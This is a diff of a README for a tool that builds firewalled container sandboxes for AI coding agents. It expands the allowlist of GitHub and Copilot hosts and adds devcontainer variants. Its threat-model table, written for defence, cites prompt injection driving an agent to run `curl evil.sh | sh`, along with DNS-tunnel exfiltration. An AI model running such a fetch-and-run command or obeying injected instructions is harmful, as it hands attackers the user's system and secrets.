@@ -9,7 +9,7 @@ The tool generates a derived image with OpenSpec and detected agent CLIs, saniti
 Given `project-sandbox /path/to/repo python:3.12-slim`:
 
 1. Read host `git config --global` identity.
-2. Render `<project>/.project-sandbox/` — `Dockerfile`, `entrypoint.sh`, `init-firewall.sh`, sanitized `claude/settings.json` and `codex/config.toml`, and a devcontainer post-start init script. Agent credentials are staged separately under `/tmp` with private directory permissions to reduce the chance of accidentally committing them.
+2. Render `<project>/.project-sandbox/` — `Dockerfile` and `Dockerfile.devcontainer`, `entrypoint.sh`, `init-firewall.sh` and `init-firewall-devcontainer.sh`, sanitized `claude/settings.json`, `claude-devcontainer/settings.json`, `codex/config.toml`, `codex-devcontainer/config.toml`, a local `.gitignore` safeguard, and a devcontainer post-start init script. Agent credentials are staged separately under `/tmp` with private directory permissions to reduce the chance of accidentally committing them.
 3. Render `<project>/.devcontainer/` with symlinks back into `.project-sandbox/` so the Dockerfile and firewall script remain a single source of truth.
 4. Detect available host agent configs (`~/.claude`, `~/.codex`, `~/.config/opencode`) and install only those agent CLIs into the generated Dockerfile. OpenSpec and Bash are always available.
 5. Append `.project-sandbox/` and `.devcontainer/` to `<project>/.gitignore` (idempotent).
@@ -238,7 +238,7 @@ When the firewall is enabled (default), `init-firewall.sh` runs as root inside t
   pins the resulting addresses into `/etc/hosts` and `ipset`, then blocks
   general outbound DNS to close DNS-tunnel exfiltration.
 - Allows Claude/Anthropic endpoints (`api.anthropic.com`, `claude.ai`, `code.claude.com`, `platform.claude.com`), `api.openai.com`, `auth.openai.com`, and `chatgpt.com`.
-- When `--allow-github` is set, also allows GitHub's published web/API/git IP ranges (fetched from `api.github.com/meta`) and DNS-pinned GitHub/Copilot hosts including `github.com`, `api.github.com`, `raw.githubusercontent.com`, `objects.githubusercontent.com`, and `api.githubcopilot.com`.
+- When `--allow-github` is set, also allows GitHub's published web/API/git IP ranges (fetched from `api.github.com/meta`) and DNS-pinned GitHub/Copilot hosts: `github.com`, `api.github.com`, `uploads.github.com`, `codeload.github.com`, `lfs.github.com`, `raw.githubusercontent.com`, `objects.githubusercontent.com`, `github-cloud.githubusercontent.com`, `api.githubcopilot.com`, `api.individual.githubcopilot.com`, `api.business.githubcopilot.com`, `api.enterprise.githubcopilot.com`, `copilot-proxy.githubusercontent.com`, `origin-tracker.githubusercontent.com`, `copilot-telemetry.githubusercontent.com`, and `collector.github.com`.
 - In the devcontainer firewall variant only, allows the host gateway address so port-forwarding and IDE attach work. Direct CLI runs omit this host-network allowlist.
 - Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling IPv6 via `sysctl` when `ip6_tables` is unavailable — the script exits with an error if both `ip6tables` and `sysctl` are unavailable.
 
@@ -263,8 +263,8 @@ Customize:
 | DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
 | Malicious npm post-install scripts | Run as UID 1000 inside the container; no access to unmounted host paths. |
-| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` (Claude) and `disable_update_check = true` (Codex). |
-| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` (Claude); `analytics.enabled = false` and `feedback.enabled = false` (Codex). |
+| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` (Claude) and `disable_update_check = true` (Codex). OpenCode config is not currently sanitized — see TODO. |
+| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` (Claude); `analytics.enabled = false` and `feedback.enabled = false` (Codex). OpenCode config is not currently filtered for telemetry settings — see TODO. |
 | API token leakage via process environment | Tokens are passed through mounted credential files, not environment variables; host staging files are kept under a private `/tmp` directory. |
 
 The tool does **not** protect against:
